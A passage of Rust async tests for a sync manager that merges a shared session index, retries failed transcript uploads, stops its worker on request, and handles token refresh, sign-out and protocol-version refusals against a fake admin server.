        );
        // A team owner mirrors shareable keys; this is not one.
        mgr.set_team(Some("t1".into()), Some("Team".into()), true)
            .await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let value = index_entry("m1", 1, "2026-09-24T10:00:00Z");

        mgr.apply_state(SESSION_INDEX_KEY, &value, &push_state)
            .await
            .unwrap();
        let written: Vec<PathBuf> = std::fs::read_dir(&home)
            .unwrap()
            .chain(std::fs::read_dir(&store).unwrap())
            .map(|e| e.unwrap().path())
            .collect();
        assert_eq!(
            written,
            vec![store.join("projects.json")],
            "nothing lands on disk"
        );

        mgr.push_with_merge(SESSION_INDEX_KEY, value.clone(), &push_state)
            .await
            .unwrap();
        assert_eq!(admin.lock().unwrap().states[SESSION_INDEX_KEY].0, value);
        assert!(
            !admin
                .lock()
                .unwrap()
                .requests
                .iter()
                .any(|(_, p)| p.starts_with("/api/tcb/teams")),
            "never mirrored to the team"
        );
    }

    #[tokio::test]
    async fn a_failed_session_index_update_stays_owed_until_it_lands() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        // This machine (m1) uploaded segment 2 of the session.
        std::fs::write(store.join("machine_id"), "m1").unwrap();
        std::fs::write(
            store.join("transcript_sync.json"),
            serde_json::to_vec(&json!({"sessions": {SID: {"pushedLines": 3, "ownSeq": 2}}}))
                .unwrap(),
        )
        .unwrap();
        let admin = SharedAdmin::default();
        {
            let mut st = admin.lock().unwrap();
            // The other machine's entry is on the server already (from an
            // hour ago: the merge prunes by age, so no fixed date).
            let an_hour_ago = registry::format_timestamp(Utc::now() - Duration::hours(1));
            st.states.insert(
                SESSION_INDEX_KEY.into(),
                (index_entry("mac", 5, &an_hour_ago), 4),
            );
            st.failing.insert(SESSION_INDEX_KEY.into());
        }
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let sync = test_transcripts(&mgr, &store, tmp.path());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        assert!(mgr.push_session_index(&sync, &push_state).await.is_err());
        let owed = sync
            .index_owed()
            .await
            .unwrap()
            .expect("still owed after the failure");
        assert_eq!(owed[SID]["m1"]["seq"], 2);

        admin.lock().unwrap().failing.clear();
        mgr.push_session_index(&sync, &push_state).await.unwrap();
        let server = admin.lock().unwrap().states[SESSION_INDEX_KEY].clone();
        assert_eq!(server.1, 5);
        assert_eq!(server.0[SID]["m1"]["seq"], 2);
        assert_eq!(server.0[SID]["mac"]["seq"], 5, "merged, not replaced");
        assert_eq!(sync.index_owed().await.unwrap(), None);

        // Nothing owed: no request.
        let before = admin.lock().unwrap().requests.len();
        mgr.push_session_index(&sync, &push_state).await.unwrap();
        assert_eq!(admin.lock().unwrap().requests.len(), before);
    }

    #[tokio::test]
    async fn the_index_poll_hands_on_each_new_version_once() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let (jobs, mut rx) = mpsc::unbounded_channel();
        let next = |rx: &mut mpsc::UnboundedReceiver<TranscriptJob>| match rx.try_recv() {
            Ok(TranscriptJob::PullIndexed(v)) => Some(v),
            Ok(other) => panic!("unexpected job {other:?}"),
            Err(_) => None,
        };

        // No index on the server yet: nothing to do.
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(next(&mut rx), None);

        let v1 = index_entry("mac", 1, "2026-09-24T09:00:00Z");
        admin
            .lock()
            .unwrap()
            .states
            .insert(SESSION_INDEX_KEY.into(), (v1.clone(), 1));
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(next(&mut rx), Some(v1));
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(
            next(&mut rx),
            None,
            "same version: one GET, nothing handed on"
        );

        // A full pull records the version as known; that must not hide it
        // from the poll.
        let v2 = index_entry("mac", 2, "2026-09-24T09:05:00Z");
        admin
            .lock()
            .unwrap()
            .states
            .insert(SESSION_INDEX_KEY.into(), (v2.clone(), 2));
        push_state
            .lock()
            .await
            .known_version
            .insert(SESSION_INDEX_KEY.to_string(), 2);
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(next(&mut rx), Some(v2.clone()));

        // The last index pull left a session waiting: the same version is
        // handed on again until it goes through.
        let sync = Arc::new(test_transcripts(&mgr, &store, tmp.path()));
        *mgr.transcripts.lock().unwrap() = Some(sync.clone());
        sync.set_index_retry(true);
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(next(&mut rx), Some(v2));
        sync.set_index_retry(false);
        mgr.poll_session_index(&push_state, &jobs).await.unwrap();
        assert_eq!(next(&mut rx), None);
        assert_eq!(
            admin
                .lock()
                .unwrap()
                .count("GET", "/api/tcb/state/claude-session-index"),
            6
        );
    }

    #[tokio::test]
    async fn the_session_index_is_created_only_if_absent() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        // The Mac creates the index between this machine's GET (a 404) and
        // its write.
        let mac = index_entry("mac", 5, "2026-09-24T09:00:00Z");
        admin
            .lock()
            .unwrap()
            .appear_on_miss
            .insert(SESSION_INDEX_KEY.into(), mac);
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let ours = index_entry("pc", 2, "2026-09-24T10:00:00Z");
        mgr.push_with_merge(SESSION_INDEX_KEY, ours, &push_state)
            .await
            .unwrap();
        let st = admin.lock().unwrap();
        let (server, version) = st.states[SESSION_INDEX_KEY].clone();
        assert_eq!(server[SID]["mac"]["seq"], 5, "the Mac's entry survives");
        assert_eq!(server[SID]["pc"]["seq"], 2);
        assert_eq!(version, 2);
        assert!(st.lww.is_empty(), "never a blind write: {:?}", st.lww);
    }

    #[tokio::test]
    async fn a_session_index_conflict_that_never_settles_is_not_forced() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        {
            let mut st = admin.lock().unwrap();
            st.states.insert(
                SESSION_INDEX_KEY.into(),
                (index_entry("mac", 5, "2026-09-24T09:00:00Z"), 1),
            );
            st.moving.insert(SESSION_INDEX_KEY.into());
        }
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let ours = index_entry("pc", 2, "2026-09-24T10:00:00Z");
        let err = mgr
            .push_with_merge(SESSION_INDEX_KEY, ours, &push_state)
            .await
            .unwrap_err();
        assert!(matches!(err, IdeError::CasConflict { .. }), "{err}");
        let st = admin.lock().unwrap();
        assert!(
            st.lww.is_empty(),
            "no blind write after the retries: {:?}",
            st.lww
        );
        assert!(st.puts.is_empty(), "nothing written");
    }

    async fn wait_until(what: &str, mut done: impl FnMut() -> bool) {
        for _ in 0..400 {
            if done() {
                return;
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
        panic!("timed out waiting for {what}");
    }

    #[tokio::test]
    async fn a_transient_upload_failure_is_retried_without_waiting_for_a_pull() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        // Outside `tmp`: that is the Mnemos data dir and `~/.claude` here,
        // and sessions run inside either are never synced.
        let checkouts = tempfile::tempdir().unwrap();
        let root = checkouts.path().join("repo");
        std::fs::create_dir_all(&root).unwrap();
        let root_str = root.to_string_lossy().into_owned();
        write_registry(&store, vec![record_here("p1", "repo", &root_str)]);
        std::fs::write(store.join("machine_id"), "m1").unwrap();
        let admin = SharedAdmin::default();
        // Railway is redeploying: every upload answers 502.
        admin.lock().unwrap().blobs_down = true;
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let sync = Arc::new(test_transcripts(&mgr, &store, tmp.path()));
        let file = tmp
            .path()
            .join("claude-projects")
            .join("C--repo")
            .join(format!("{SID}.jsonl"));
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        let line = json!({"type": "user", "cwd": root_str, "uuid": "u1", "sessionId": SID});
        std::fs::write(&file, format!("{line}\n")).unwrap();

        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let (jobs, rx) = mpsc::unbounded_channel();
        let worker = tokio::spawn(run_transcript_worker(
            mgr.clone(),
            push_state,
            sync,
            rx,
            &[50],
        ));
        // The last turn before walking to the other machine.
        jobs.send(TranscriptJob::Push(vec![file.clone()])).unwrap();
        let blob_puts = || {
            admin
                .lock()
                .unwrap()
                .requests
                .iter()
                .filter(|(m, p)| m == "PUT" && p.starts_with("/api/tcb/blobs/"))
                .count()
        };
        wait_until("the refused upload", || blob_puts() >= 1).await;
        admin.lock().unwrap().blobs_down = false;

        // No other job arrives (the other machine is idle, nothing pulls):
        // the worker goes back for the lines on its own and announces them.
        let segment = format!("claude-sessions/{SID}/m1-000001.jsonl.gz");
        wait_until("the retried upload", || {
            admin.lock().unwrap().blobs.contains_key(&segment)
        })
        .await;
        wait_until("the index entry", || {
            admin
                .lock()
                .unwrap()
                .states
                .get(SESSION_INDEX_KEY)
                .is_some_and(|(v, _)| v[SID]["m1"]["seq"] == 1)
        })
        .await;

        drop(jobs);
        worker.await.unwrap();
    }

    /// Agent restore waits for the first transcript pull of the run: the
    /// worker reports it once a pull is over, failed or not, and not before.
    #[tokio::test]
    async fn the_first_transcript_pull_is_reported_once_it_is_over() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        std::fs::create_dir_all(&store).unwrap();
        std::fs::write(store.join("machine_id"), "m1").unwrap();
        let admin = SharedAdmin::default();
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let sync = Arc::new(test_transcripts(&mgr, &store, tmp.path()));
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let (jobs, rx) = mpsc::unbounded_channel();
        let worker = tokio::spawn(run_transcript_worker(
            mgr.clone(),
            push_state,
            sync,
            rx,
            &[50],
        ));
        // A sweep is not a pull.
        jobs.send(TranscriptJob::Sweep).unwrap();
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
        assert!(!mgr.status_tx.borrow().first_transcript_pull_done);
        jobs.send(TranscriptJob::Pull).unwrap();
        wait_until("the first transcript pull", || {
            mgr.status_tx.borrow().first_transcript_pull_done
        })
        .await;
        drop(jobs);
        worker.await.unwrap();
    }

    /// The first pull of the run goes ahead of a sweep queued with it (or
    /// before it): agent restore waits for that pull, and a sweep can take
    /// minutes. Later pulls keep the usual order, uploads first.
    #[tokio::test]
    async fn the_first_transcript_pull_runs_before_the_startup_sweep() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        let checkouts = tempfile::tempdir().unwrap();
        let root = checkouts.path().join("repo");
        std::fs::create_dir_all(&root).unwrap();
        let root_str = root.to_string_lossy().into_owned();
        write_registry(&store, vec![record_here("p1", "repo", &root_str)]);
        std::fs::write(store.join("machine_id"), "m1").unwrap();
        let admin = SharedAdmin::default();
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        {
            // Whether the first pull was over when each upload came in.
            let status = mgr.status_tx.subscribe();
            admin.lock().unwrap().put_probe =
                Some(Box::new(move || status.borrow().first_transcript_pull_done));
        }
        let sync = Arc::new(test_transcripts(&mgr, &store, tmp.path()));
        let file = tmp
            .path()
            .join("claude-projects")
            .join("C--repo")
            .join(format!("{SID}.jsonl"));
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        let line = json!({"type": "user", "cwd": root_str, "uuid": "u1", "sessionId": SID});
        std::fs::write(&file, format!("{line}\n")).unwrap();
        // Older than the sweep's "being written right now" window.
        let old = std::time::SystemTime::now() - std::time::Duration::from_secs(600);
        std::fs::File::options()
            .write(true)
            .open(&file)
            .unwrap()
            .set_modified(old)
            .unwrap();

        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let (jobs, rx) = mpsc::unbounded_channel();
        // Both queued before the worker looks: one batch, as at startup.
        jobs.send(TranscriptJob::Sweep).unwrap();
        jobs.send(TranscriptJob::Pull).unwrap();
        let worker = tokio::spawn(run_transcript_worker(
            mgr.clone(),
            push_state,
            sync,
            rx,
            &[50],
        ));
        let segment = format!("claude-sessions/{SID}/m1-000001.jsonl.gz");
        wait_until("the sweep's upload", || {
            admin.lock().unwrap().blobs.contains_key(&segment)
        })
        .await;
        {
            let st = admin.lock().unwrap();
            assert!(!st.put_probes.is_empty());
            assert!(
                st.put_probes.iter().all(|done| *done),
                "an upload ran before the first pull was over: {:?}",
                st.put_probes
            );
        }
        drop(jobs);
        worker.await.unwrap();
    }

    /// "Delete synced data" stops sync before the server deletes: once
    /// `stop` returns, the transcript worker must not upload again, not even
    /// the retry a failed upload left owed (finding: the worker outlived
    /// `stop` and re-uploaded after the deletion).
    #[tokio::test]
    async fn stop_cancels_the_transcript_worker_and_its_owed_retry() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        let checkouts = tempfile::tempdir().unwrap();
        let root = checkouts.path().join("repo");
        std::fs::create_dir_all(&root).unwrap();
        let root_str = root.to_string_lossy().into_owned();
        write_registry(&store, vec![record_here("p1", "repo", &root_str)]);
        std::fs::write(store.join("machine_id"), "m1").unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().blobs_down = true;
        let mgr = manager_for(&fake_admin(admin.clone()).await, store.clone());
        let sync = Arc::new(test_transcripts(&mgr, &store, tmp.path()));
        let file = tmp
            .path()
            .join("claude-projects")
            .join("C--repo")
            .join(format!("{SID}.jsonl"));
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        let line = json!({"type": "user", "cwd": root_str, "uuid": "u1", "sessionId": SID});
        std::fs::write(&file, format!("{line}\n")).unwrap();

        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let (jobs, rx) = mpsc::unbounded_channel();
        let worker = tokio::spawn(run_transcript_worker(
            mgr.clone(),
            push_state,
            sync,
            rx,
            &[200],
        ));
        *mgr.transcript_worker.lock().unwrap() = Some(worker);
        jobs.send(TranscriptJob::Push(vec![file.clone()])).unwrap();
        let blob_puts = || {
            admin
                .lock()
                .unwrap()
                .requests
                .iter()
                .filter(|(m, p)| m == "PUT" && p.starts_with("/api/tcb/blobs/"))
                .count()
        };
        wait_until("the refused upload", || blob_puts() >= 1).await;

        mgr.clone().stop().await.unwrap();
        assert!(mgr.transcript_worker.lock().unwrap().is_none());
        let puts_at_stop = blob_puts();
        // The server is back; a worker that outlived `stop` would now retry.
        admin.lock().unwrap().blobs_down = false;
        tokio::time::sleep(std::time::Duration::from_millis(600)).await;
        assert_eq!(blob_puts(), puts_at_stop, "no upload after stop");
        let segment = format!("claude-sessions/{SID}/m1-000001.jsonl.gz");
        assert!(!admin.lock().unwrap().blobs.contains_key(&segment));
        // The sender is still alive: only the abort ended the worker.
        drop(jobs);
    }

    // ---- Admin session ----

    /// A manager over `admin` with its paths under `tmp`, ready to `start`.
    async fn running_manager_for(admin: &SharedAdmin, tmp: &Path) -> Arc<SyncManager> {
        let home = tmp.join("home");
        std::fs::create_dir_all(home.join(".claude").join("agents")).unwrap();
        let store = tmp.join("store");
        write_registry(
            &store,
            vec![record("local-1", "mnemos", "C:\\code\\mnemos")],
        );
        let mut auth = AdminAuth::from_tokens("https://admin.example.test", tokens());
        auth.base_url = fake_admin(admin.clone()).await;
        Arc::new(
            SyncManager::from_auth(auth)
                .with_mnemos_store_dir(store)
                .with_claude_home(&home),
        )
    }

    /// The event loop (and with it the watcher, the polls and every retry
    /// timer) has returned.
    fn loop_finished(mgr: &SyncManager) -> bool {
        mgr.handle
            .lock()
            .unwrap()
            .as_ref()
            .and_then(|running| running.join.as_ref())
            .is_some_and(|join| join.is_finished())
    }

    fn signed_out_with(mgr: &SyncManager) -> Option<String> {
        match mgr.auth_state() {
            SyncAuthState::SignedOut { reason } => Some(reason),
            _ => None,
        }
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_refused_refresh_signs_out_and_stops_all_requests() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        {
            // The refresh token died while the app was closed: the first
            // call is refused, and so is the refresh it triggers.
            let mut st = admin.lock().unwrap();
            st.session_expired = true;
            st.refresh_status = Some("401 Unauthorized");
        }
        let mgr = running_manager_for(&admin, tmp.path()).await;
        mgr.clone().start().await.unwrap();

        wait_until("signed out", || signed_out_with(&mgr).is_some()).await;
        wait_until("the sync loop to end", || loop_finished(&mgr)).await;
        assert_eq!(
            signed_out_with(&mgr).as_deref(),
            Some("Session not found or expired"),
            "the server's reason, for the UI"
        );
        let status = mgr.status_tx.borrow().clone();
        assert!(!status.running);
        assert!(
            status.first_pull_done,
            "the app's first reconcile must not wait on it"
        );
        assert_eq!(admin.lock().unwrap().count("POST", "/api/auth/refresh"), 1);

        // Nothing reaches the server any more: no pull on request, no direct
        // call through the shared client, and no timer firing later.
        let seen = admin.lock().unwrap().requests.len();
        mgr.clone().pull_now().await.unwrap();
        let err = mgr.client.get_state("projects").await.unwrap_err();
        assert!(is_session_rejected(&err), "{err}");
        assert_eq!(status_error_message(&err), "signed out");
        tokio::time::sleep(std::time::Duration::from_millis(400)).await;
        assert_eq!(admin.lock().unwrap().requests.len(), seen);

        mgr.stop().await.unwrap();
    }

    #[tokio::test]
    async fn a_legacy_key_that_looks_wrapped_is_applied_as_it_is() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        std::fs::create_dir_all(home.join(".claude")).unwrap();
        let mgr = Arc::new(
            SyncManager::from_auth(AdminAuth::from_tokens(
                "https://admin.example.test",
                tokens(),
            ))
            .with_mnemos_store_dir(tmp.path().join("store"))
            .with_claude_home(&home),
        );
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let cfg = GLOBAL_FILES
            .iter()
            .find(|c| !c.platform_specific && !c.raw)
            .expect("a shared JSON global file");
        assert!(!crate::protocol::uses_envelope(cfg.sync_key));
        let target = home.join(".claude").join(cfg.file_name);

        // Older builds wrote this file's JSON as it was; one that happens to
        // have only `schema` and `data` is still the user's file, not an
        // envelope, and lands on disk unchanged.
        for value in [
            json!({"schema": 1, "data": {"x": 1}}),
            json!({"schema": 99, "data": {"x": 1}}),
        ] {
            mgr.apply_state(cfg.sync_key, &value, &push_state)
                .await
                .unwrap();
            let written: Value = serde_json::from_slice(&std::fs::read(&target).unwrap()).unwrap();
            assert_eq!(written, value);
        }
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn every_request_carries_the_protocol_header() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = running_manager_for(&admin, tmp.path()).await;
        mgr.clone().start().await.unwrap();
        wait_until("the startup sync", || {
            mgr.status_tx.borrow().first_pull_done
        })
        .await;
        let expected = crate::protocol::SYNC_PROTOCOL_VERSION.to_string();
        let protocols = admin.lock().unwrap().protocols.clone();
        assert!(!protocols.is_empty());
        assert!(
            protocols
                .iter()
                .all(|p| p.as_deref() == Some(expected.as_str())),
            "{protocols:?}"
        );
        assert_eq!(mgr.auth_state(), SyncAuthState::SignedIn);
        mgr.stop().await.unwrap();
    }

    /// Gates review finding 5: the `.env` an older build uploaded can be
    /// removed from the server while `.env` sync is off here, and only then.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn the_servers_env_copy_can_be_removed_while_env_sync_is_off() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-env".into(), (json!("API_KEY=old\n"), 3));
        let mgr = running_manager_for(&admin, tmp.path()).await;
        mgr.clone().start().await.unwrap();
        wait_until("the startup sync", || {
            mgr.status_tx.borrow().first_pull_done
        })
        .await;
        assert!(admin.lock().unwrap().states.contains_key("claude-env"));
        mgr.clone().remove_server_env().await.unwrap();
        assert!(!admin.lock().unwrap().states.contains_key("claude-env"));
        // Nothing local was written from it.
        assert!(!tmp.path().join("home").join(".claude").join(".env").exists());

        mgr.set_claude_env_sync(true).unwrap();
        let err = mgr.clone().remove_server_env().await.unwrap_err();
        assert!(err.to_string().contains("turn off"), "{err}");
        mgr.stop().await.unwrap();
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_refused_protocol_stops_sync_and_asks_for_an_update() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().min_protocol = Some(crate::protocol::SYNC_PROTOCOL_VERSION + 1);
        let mgr = running_manager_for(&admin, tmp.path()).await;
        mgr.clone().start().await.unwrap();

        wait_until("update required", || {
            matches!(mgr.auth_state(), SyncAuthState::UpdateRequired { .. })
        })
        .await;
        wait_until("the sync loop to end", || loop_finished(&mgr)).await;
        let SyncAuthState::UpdateRequired { reason } = mgr.auth_state() else {
            unreachable!()
        };
        assert!(reason.contains("Update Mnemos"), "{reason}");
        assert!(!mgr.status_tx.borrow().running);

        // Nothing reaches the server any more.
        let seen = admin.lock().unwrap().requests.len();
        let err = mgr.client.get_state("projects").await.unwrap_err();
        assert!(crate::client::is_upgrade_required(&err), "{err}");
        assert!(!is_transient(&err));
        assert_eq!(status_error_message(&err), "update Mnemos to sync");
        tokio::time::sleep(std::time::Duration::from_millis(400)).await;
        assert_eq!(admin.lock().unwrap().requests.len(), seen);
        mgr.stop().await.unwrap();
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_session_refused_while_running_stops_the_loop() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = running_manager_for(&admin, tmp.path()).await;
        mgr.clone().start().await.unwrap();
        wait_until("the startup sync", || {
            mgr.status_tx.borrow().first_pull_done
        })
        .await;
        assert_eq!(mgr.auth_state(), SyncAuthState::SignedIn);
        assert!(mgr.status_tx.borrow().running);

        // Hours later the server ends the session.
        {
            let mut st = admin.lock().unwrap();
            st.session_expired = true;
            st.refresh_status = Some("403 Forbidden");
        }
        mgr.status_tx
            .send_modify(|s| s.last_pull_at = Some(UNIX_EPOCH));
        // Whether this pull or the transcript worker meets the refusal first,
        // the loop ends on its next tick.
        let _ = mgr.clone().pull_now().await;
        wait_until("the sync loop to end", || loop_finished(&mgr)).await;
        assert_eq!(
            signed_out_with(&mgr).as_deref(),
            Some("Session not found or expired")
        );
        assert!(!mgr.status_tx.borrow().running);
        assert_eq!(
            admin.lock().unwrap().count("POST", "/api/auth/refresh"),
            1,
            "one refusal is enough; nothing asks again"
        );

        mgr.stop().await.unwrap();
    }

    #[tokio::test]
    async fn a_refresh_that_meets_a_redeploy_or_no_network_keeps_the_session() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        {
            let mut st = admin.lock().unwrap();
            st.session_expired = true;
            st.refresh_status = Some("502 Bad Gateway");
        }
        let mgr = manager_for(&fake_admin(admin.clone()).await, store);
        for attempt in 1..=2 {
            let err = mgr.client.get_state("projects").await.unwrap_err();
            assert!(is_transient(&err), "retried on the backoff: {err}");
            assert!(!is_session_rejected(&err), "{err}");
            assert_eq!(status_error_message(&err), "server 502 - will retry");
            assert_eq!(
                admin.lock().unwrap().count("POST", "/api/auth/refresh"),
                attempt,
                "not held back: the next attempt asks again"
            );
        }
        assert!(!mgr.publish_session_health());
        assert_eq!(mgr.auth_state(), SyncAuthState::SignedIn);

        // Offline, with the access token already expired so the refresh is
        // the first thing that fails.
        let mut auth = AdminAuth::from_tokens(
            "https://admin.example.test",
            AdminTokens {
                expires_at: Utc::now() - Duration::minutes(1),
                ..tokens()
            },
        );
        auth.base_url = "http://127.0.0.1:1".to_string();
        let offline = Arc::new(SyncManager::from_auth(auth));
        let err = offline.client.get_state("projects").await.unwrap_err();
        assert!(is_transient(&err) && !is_session_rejected(&err), "{err}");
        assert!(!offline.publish_session_health());
        assert_eq!(offline.auth_state(), SyncAuthState::SignedIn);
    }

    #[tokio::test]
    async fn a_refresh_a_proxy_blocks_is_retried_and_keeps_the_session() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let admin = SharedAdmin::default();
        {
            // A client network's proxy answers the admin host with its own
            // 403 page. The session behind it is fine.
            let mut st = admin.lock().unwrap();
            st.session_expired = true;
            st.refresh_status = Some("403 Forbidden");
            st.refresh_block_page = true;
        }
        let mgr = manager_for(&fake_admin(admin.clone()).await, store);
        for attempt in 1..=2 {
            let err = mgr.client.get_state("projects").await.unwrap_err();
            assert!(is_transient(&err), "retried on the backoff: {err}");
            assert!(!is_session_rejected(&err), "{err}");
            assert_eq!(status_error_message(&err), "server 403 - will retry");
            assert_eq!(
                admin.lock().unwrap().count("POST", "/api/auth/refresh"),
                attempt,
                "not held back: the next attempt asks again"
            );
        }
        assert!(!mgr.publish_session_health());
        assert_eq!(mgr.auth_state(), SyncAuthState::SignedIn);

        // Off that network, the next request goes through.
        {
            let mut st = admin.lock().unwrap();
            st.session_expired = false;
            st.refresh_block_page = false;
        }
        assert!(mgr.client.get_state("projects").await.unwrap().is_none());
    }

    /// The refresh token another client in this process rotated away (the
    /// suggest flow refreshes on its own): the server refuses it, but the
    /// keyring holds the pair that replaced it.
    #[tokio::test]
    async fn a_refresh_token_another_client_rotated_continues_on_the_saved_login() {
        let admin = SharedAdmin::default();
        admin.lock().unwrap().refresh_status = Some("401 Unauthorized");
        let base_url = fake_admin(admin.clone()).await;
        let stale = AdminAuth {
            base_url: base_url.clone(),
            tokens: Some(AdminTokens {
                expires_at: Utc::now() - Duration::minutes(1),
                ..tokens()
            }),
        };
        let saved = AdminAuth {
            base_url,
            tokens: Some(AdminTokens {
                access_token: "AT2".to_string(),
                refresh_token: "RT2".to_string(),
                expires_at: Utc::now() + Duration::hours(1),
            }),
        };
        let client = SyncClient::new(stale).with_saved_login(move || Ok(saved.clone()));
        client.note_save_failed("Access is denied.".into());

        assert!(
            client.get_state("projects").await.unwrap().is_none(),
            "the request went through on the saved login"
        );
        assert_eq!(
            client.session_health(),
            SessionHealth::default(),
            "neither signed out nor behind the keyring"
        );
        let adopted = client.auth.lock().await.tokens.clone().unwrap();
        assert_eq!(adopted.refresh_token, "RT2");
        let st = admin.lock().unwrap();
        assert_eq!(st.count("POST", "/api/auth/refresh"), 1);
        assert_eq!(st.count("GET", "/api/tcb/state/projects"), 1);
    }

    #[tokio::test]
    async fn a_refused_refresh_is_final_when_nothing_newer_is_saved() {
        let admin = SharedAdmin::default();
        admin.lock().unwrap().refresh_status = Some("401 Unauthorized");
        let base_url = fake_admin(admin.clone()).await;
        let expired = |refresh_token: &str| AdminTokens {
            access_token: "AT".to_string(),
            refresh_token: refresh_token.to_string(),
            expires_at: Utc::now() - Duration::minutes(1),
        };
        let login = |base_url: &str, tokens: AdminTokens| AdminAuth {
            base_url: base_url.to_string(),
            tokens: Some(tokens),
        };
        let fresh = AdminTokens {
            access_token: "AT2".to_string(),
            refresh_token: "RT2".to_string(),
            expires_at: Utc::now() + Duration::hours(1),
        };
        let cases = [
            ("nothing saved", None, 1),
            (
                "the refused token itself",
                Some(login(&base_url, expired("RT"))),
                1,
            ),
            (
                "a login for another server",
                Some(login("https://elsewhere.example", fresh)),
                1,
            ),
            // Adopted, gets one refresh of its own, and that refusal is final.
            (
                "a newer login the server refuses too",
                Some(login(&base_url, expired("RT2"))),
                2,
            ),
        ];
        for (what, saved, refreshes) in cases {
            let before = admin.lock().unwrap().count("POST", "/api/auth/refresh");
            let client = SyncClient::new(login(&base_url, expired("RT")))
                .with_saved_login(move || saved.clone().ok_or(IdeError::NotAuthenticated));
            let err = client.get_state("projects").await.unwrap_err();
            assert!(is_session_rejected(&err), "{what}: {err}");
            assert_eq!(
                client.session_health().rejected.as_deref(),
                Some("Session not found or expired"),
                "{what}"
            );
            assert_eq!(
                admin.lock().unwrap().count("POST", "/api/auth/refresh") - before,
                refreshes,
                "{what}"
            );
        }
    }

    #[test]
    fn an_unsaved_login_reads_as_not_saved_and_a_refused_one_outranks_it() {
        let mgr = Arc::new(SyncManager::from_auth(AdminAuth::from_tokens(
            "https://admin.example.test",
            tokens(),
        )));
        let mut status = mgr.status();
        assert_eq!(mgr.auth_state(), SyncAuthState::SignedIn);

        mgr.note_token_not_saved("Access is denied.".into());
        assert!(status.has_changed().unwrap());
        assert_eq!(
            mgr.auth_state(),
            SyncAuthState::TokenNotSaved {
                reason: "Access is denied.".into()
            }
        );
        // Still running: only the next start is at risk.
        status.borrow_and_update();
        assert!(!mgr.publish_session_health());
        assert!(!status.has_changed().unwrap(), "no change, no wake-up");

        let both = SessionHealth {
            rejected: Some("Session not found or expired".into()),
            save_failed: Some("Access is denied.".into()),
            upgrade_required: None,
        };
        assert_eq!(
            SyncAuthState::from_health(&both),
            SyncAuthState::SignedOut {
                reason: "Session not found or expired".into()
            }
        );
        // A protocol refusal outranks both: signing in again would not help.
        let all = SessionHealth {
            upgrade_required: Some("Update Mnemos to keep syncing.".into()),
            ..both
        };
        assert_eq!(
            SyncAuthState::from_health(&all),
            SyncAuthState::UpdateRequired {
                reason: "Update Mnemos to keep syncing.".into()
            }
        );
        assert!(SyncAuthState::from_health(&all).halts_sync());
        assert!(!SyncAuthState::SignedIn.halts_sync());
        assert_eq!(
            SyncAuthState::from_health(&SessionHealth::default()),
            SyncAuthState::SignedIn
        );
    }

    // ---- Pulls never delete or silently clobber ----

    fn b64(s: &str) -> Value {
        Value::String(B64.encode(s))
    }

    /// Today's `~/.claude/backups/tcb-sync-<date>` under a test home.
    fn backup_root(home: &Path) -> PathBuf {
